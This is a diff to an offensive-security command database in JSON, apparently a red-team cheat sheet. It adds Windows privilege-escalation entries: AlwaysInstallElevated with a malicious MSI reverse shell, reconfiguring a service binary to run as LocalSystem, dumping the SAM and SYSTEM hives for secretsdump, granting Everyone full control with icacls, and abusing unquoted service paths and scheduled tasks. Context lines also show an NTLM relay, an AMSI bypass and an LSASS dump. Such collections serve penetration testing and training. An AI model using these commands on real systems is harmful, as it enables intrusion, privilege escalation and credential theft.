@@ -551,6 +551,24 @@
     "name": "Impacket-PsExec-PassTheTicket"
   },
   {
+    "description": "This command shows the set of assigned privileges of the current user. However there are a couple of privileges that can be abused and those can be seen on the Priv2Admin GitHub.\n",
+    "command": "whoami /priv\n",
+    "items": [
+      "Shell"
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "Enumeration"
+    ],
+    "references": [
+      "https://github.com/gtworek/Priv2Admin",
+      "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/whoami"
+    ],
+    "name": "whoami"
+  },
+  {
     "description": "Impacket's ntlmrelayx.py performs NTLM Relay Attacks, creating an SMB and HTTP server and relaying credentials to various different protocols (SMB, HTTP, LDAP, etc.).\n\nThe below command will perform WPAD spoofing to force the victim machine to authenticate to the attacker controlled host. The command will then relay the authentication to create a new computer object and grant it delegation rights to impersonate users on the victim machine. This command should be used in conjunction with mitm6.\n\nCommand Reference:\n\n\tTarget Domain Controller: dc.test.local\n",
     "command": "python3 ntlmrelayx.py -t ldaps://dc.test.local -wh test-wpad --delegat-access\n",
     "items": [
@@ -811,6 +829,24 @@
     "name": "PowerView-Get-DomainComputer-Constrained"
   },
   {
+    "description": "This command list the software that is available on the Windows machine. It can be useful to enumerate the software versions and check for known vulnerabilities and public exploit. Use exploit-db.\n",
+    "command": "wmic product get name,version,vendor\n",
+    "items": [
+      "Shell"
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "Enumeration",
+      "General"
+    ],
+    "references": [
+      "https://www.exploit-db.com/"
+    ],
+    "name": "list-services-windows"
+  },
+  {
     "description": "Smbclient is a tool used to communicate with SMB servers. The following command will connect to an SMB share `C$` using valid credentials.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tDomain: test.local\n\n\tSMB Share: C$\n\n\tUsername: john\n\n\tPassword: password123\n",
     "command": "smbclient \\\\\\\\test.local\\\\C$ -I 10.10.10.1 -U john password123\n",
     "items": [
@@ -891,6 +927,24 @@
       "https://www.harmj0y.net/blog/redteaming/ghostpack/"
     ],
     "name": "SharpWMI"
+  },
+  {
+    "description": "Windows installer files (also known as .msi files) are used to install applications on the system. They usually run with the privilege level of the user that starts it. However, these can be configured to run with higher privileges from any user account (even unprivileged ones). This could potentially allow us to generate a malicious MSI file that would run with admin privileges.\n\nCommand Reference:\n```\nC:\\Windows\\Temp\\malicious.msi: malicious msi containing, for example, reverse shell\n```\n",
+    "command": "msiexec /quiet /qn /i C:\\Windows\\Temp\\malicious.msi\n",
+    "code": "The below registers must be set in order to exploit this vulnerability:\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\n",
+    "items": [
+      "Shell"
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "PrivEsc"
+    ],
+    "references": [
+      "https://dmcxblue.gitbook.io/red-team-notes/privesc/unquoted-service-path"
+    ],
+    "name": "AlwaysInstallElevated"
   },
   {
     "description": "SharpDump.exe is part of the GhostPack suite of tools and is a C# port of PowerSploit's Out-Minidump.ps1. It can dump the process for LSASS or a specific process given it's PID. This dump can then be fed into mimikatz to extract sensitive information. The following command simply dumps the LSASS process.\n",
@@ -1105,6 +1159,25 @@
     "name": "Chisel-proxychains"
   },
   {
+    "description": "AccessChk is an tool from Sysinternals to gain information about the access control of a service. If the service DACL (not the service's executable DACL) allow you to modify the configuration of a service, you will be able to reconfigure the service. From the AccessChk output you must verify whether OWNER has higher permission than ACCESS_ALLOWED_ACE_TYPE, if you have control over ACCESS_ALLOWED_ACE_TYPE you can perform privesc by changing executable of service. This will allow you to point to any executable you need and run it with any account you prefer, including SYSTEM itself. This is shown in the extra code section.\n\nCommand Reference:\n```\nthmservice: Service to see the access control from\n```\n",
+    "command": ".\\accesschk.exe -qlc thmservice\n",
+    "code": "To change the service's associated executable and account, we can use the following command (mind the spaces after the equal signs when using sc.exe, in PowerShell):\nsc config THMService binPath= \"C:\\Users\\thm-unpriv\\rev-svc3.exe\" obj= LocalSystem\n\nC:\\tools\\AccessChk> accesschk64.exe -qlc thmservice\n[0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\\SYSTEM\n      SERVICE_QUERY_STATUS\n      SERVICE_QUERY_CONFIG\n      SERVICE_INTERROGATE\n      SERVICE_ENUMERATE_DEPENDENTS\n      SERVICE_PAUSE_CONTINUE\n      SERVICE_START\n      SERVICE_STOP\n      SERVICE_USER_DEFINED_CONTROL\n      READ_CONTROL\n[4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\\Users\n      SERVICE_ALL_ACCESS\n",
+    "items": [
+      "Shell"
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "Enumeration",
+      "PrivEsc"
+    ],
+    "references": [
+      "https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk"
+    ],
+    "name": "accesschk"
+  },
+  {
     "description": "Evil-WinRM uses the Windows Management Instrumentation (WMI) to give you an interactive shell on the Windows host.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tUsername: john\n\n\tPassword: password123\n\n\tHash (-H):  807726fcf9f188adc26eeafd7dc16bb7\n",
     "command": "evil-winrm -i 10.10.10.1 -u john -p password123\n",
     "items": [
@@ -1150,6 +1223,25 @@
       "https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/"
     ],
     "name": "PKINIT-getnthash"
+  },
+  {
+    "description": "If a user has the SeBackupPrivilege or SeRestorePrivilege rights, which is default when a user is in the \"Backup Operators\" group. The user can backup the SAM and SYSTEM hashes, which can be usefull to start a Pass-The-Hash attack. With the commands it is possible to extract the SAM en SYSTEM hashes from the registry.\n\nCommand Reference:\n```\nRegister: hklm\\system & hklm\\sam\n```\n",
+    "command": "reg save hklm\\system C:\\Users\\THMBackup\\system.hive\n",
+    "code": "reg save hklm\\sam C:\\Users\\THMBackup\\sam.hive \n\nAfter retrieving use secretsdump:\nsecretsdump.py -sam '/path/to/sam.hive' -system '/path/to/system.hive' LOCAL\n",
+    "items": [
+      "Shell"
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "Emumeration",
+      "PrivEsc"
+    ],
+    "references": [
+      "https://github.com/gtworek/Priv2Admin/blob/master/SeBackupPrivilege.md"
+    ],
+    "name": "backup-privilege"
   },
   {
     "description": "\"CrackMapExec (a.k.a CME) is a post-exploitation tool that helps automate assessing the security of large Active Directory networks.\" - https://github.com/byt3bl33d3r/CrackMapExec/wiki. This command will enumerate the SMB host using anonymous access. \n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n",
@@ -1259,6 +1351,26 @@
       "https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/"
     ],
     "name": "PowerView-Get-DomainComputer-Unconstrained"
+  },
+  {
+    "description": "icacls in Windows is a command-line tool for managing access control lists. From an attacker's viewpoint, exploiting icacls could lead to unauthorized modifications of file and directory permissions, potentially facilitating data exfiltration, privilege escalation, or network compromise. In this example is the basic command is shown to view the rights of file and in the extra code is shown how to give more permission. \n\nCommand Reference:\n```\nc:\\tasks\\schtask.bat: file you want to see the rights.\n\n/grant: with the /grant parameter you can give additional rights to a file, for example to execute a file\n```\n",
+    "command": "icacls c:\\tasks\\schtask.bat\n",
+    "code": "icacls C:\\Users\\thm-unpriv\\rev-svc3.exe /grant Everyone:F\n\nC:\\> icacls c:\\tasks\\schtask.bat\nc:\\tasks\\schtask.bat NT AUTHORITY\\SYSTEM:(I)(F)\n                  BUILTIN\\Administrators:(I)(F)\n                  BUILTIN\\Users:(I)(F)\n",
+    "items": [
+      "Shell"
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "Enumeration",
+      "General",
+      "PrivEsc"
+    ],
+    "references": [
+      "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/icacls"
+    ],
+    "name": "icacls"
   },
   {
     "description": "One-liner to bypass the AMSI in a Powershell. Manipulating a result variable set by AmsiInitialize can also lead to another AMSI bypass through the amsiInitFailed field. The additional code is Rasta Mouse's memory patch to bypass AMSI, run the one-liner and the additional code to disable AMSI in powershell.\n\nCommand Reference:\n```\nloop the GetTypes method, searching for all types containing the string \u201ciUtils\u201d in its name\n\nGetFields accepts filtering modifiers, we\u2019ll apply the NonPublic and Static filters to help narrow the results\n\nloop through all the fields, searching for a name containing \u201cnitFailed\u201d, as this does not be marked as malicious looking for the amsiContext\n\nset the value to True as this bypasses the AMSI\n```\n",
@@ -1467,6 +1579,25 @@
       "https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/"
     ],
     "name": "Python-InteractiveShell"
+  },
+  {
+    "description": "Each service on a Windows machine will have an associated executable which will be run by the Service Control Manager (SCM) whenever a service is started. The associated executable is specified through the BINARY_PATH_NAME parameter, and the account used to run the service is shown on the SERVICE_START_NAME parameter. Of you have permission on the BINARY_PATH_NAME you can evelvate your rights to the user as mention in SERVICE_START_NAME. \n\nAnother point of interest is the unquoted BINARY_PATH_NAME, as in the extra code, Windows interpretation will be \"C:\\MyPrograms\\Disk.exe\". So if you have control over the directory you can create a malicious executable.\n\nCommand Reference:\n```\n\"disk sorter enterprise\": Service on the Windows machine\n```\n",
+    "command": "sc qc \"disk sorter enterprise\"\n",
+    "code": "List all services on machine:\nsc queryex type= service state= all OR via TaskManager\n\nC:\\> sc qc \"disk sorter enterprise\"\n[SC] QueryServiceConfig SUCCESS\n\nSERVICE_NAME: disk sorter enterprise\n        TYPE               : 10  WIN32_OWN_PROCESS\n        START_TYPE         : 2   AUTO_START\n        ERROR_CONTROL      : 0   IGNORE\n        BINARY_PATH_NAME   : C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe\n        LOAD_ORDER_GROUP   :\n        TAG                : 0\n        DISPLAY_NAME       : Disk Sorter Enterprise\n        DEPENDENCIES       :\n        SERVICE_START_NAME : .\\svcusr2 \n\nOneliner for locating unquoted service paths:\nwmic service get name,displayname,startmode,pathname | findstr /i /v \"C:\\Windows\\\\\" |findstr /i /v \"\"\"\n",
+    "items": [
+      "Shell"
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "Enumeration",
+      "PrivEsc"
+    ],
+    "references": [
+      "https://www.ired.team/offensive-security/privilege-escalation/unquoted-service-paths"
+    ],
+    "name": "sc-misconfiguration"
   },
   {
     "description": "Impacket's reg.py is a remote registry manipulation tool, providing similar functionality to reg.exe in Windows.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tDomain: test.local\n\n\tUsername: john\n\n\tPassword: password123\n",
@@ -2573,6 +2704,25 @@
       "https://ppn.snovvcrash.rocks/red-team/maldev/code-injection/shellcode-runners#c-dll-with-powershell-cradle-in-memory"
     ],
     "name": "ShellcodeRunner-VBA"
+  },
+  {
+    "description": "Scheduled tasks can be listed from the command line using the 'schtasks' command without any options. To retrieve detailed information about any of the specific tasks, you can use the below command. Within the output of this command Task to Run and Run as User are specified, if you have access (modify/write) to the executable it is possible to perform action with the privilege of Run As User.\n\nCommand Reference:\n```\nvuln_task: tasks which is found.\n\nTask to Run: Executable which is used in the tasks\n\nRun as User: User in which context the tasks runs (so you can elavate to this user)\n```\n",
+    "command": "schtasks /query /tn vuln_task /fo list /v\n",
+    "code": "C:\\> schtasks /query /tn vulntask /fo list /v\nFolder: \\\nHostName:                             THM-PC1\nTaskName:                             \\vulntask\nTask To Run:                          C:\\tasks\\schtask.bat\nRun As User:                          taskusr1 \n",
+    "items": [
+      "Shell"
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "Enumeration",
+      "PrivEsc"
+    ],
+    "references": [
+      "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks"
+    ],
+    "name": "schtasks"
   },
   {
     "description": "\"CrackMapExec (a.k.a CME) is a post-exploitation tool that helps automate assessing the security of large Active Directory networks.\" - https://github.com/byt3bl33d3r/CrackMapExec/wiki. The following command will enumerate a list of SMB hosts with signing not enforced, allowing you to relay credentials to them using ntlmrelayx.py.\n\nCommand Reference:\n\n\tSMB Hosts: smb_hosts.txt\n",
